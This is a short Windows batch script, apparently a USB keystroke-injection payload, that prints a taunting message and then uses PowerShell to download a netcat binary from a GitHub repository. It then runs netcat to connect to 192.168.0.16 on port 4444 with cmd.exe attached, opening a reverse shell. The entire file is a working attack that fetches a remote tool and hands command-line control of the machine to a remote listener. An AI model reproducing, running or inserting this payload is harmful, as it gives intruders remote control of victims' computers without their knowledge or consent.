@echo off
echo NME has you.....
powershell -Command "& wget 'https://github.com/aquaktus/ducky-payload/blob/master/nc.txt?raw=true' -UseBasicParsing -O nc.exe"
nc -nv 192.168.0.16 4444 -e cmd.exe
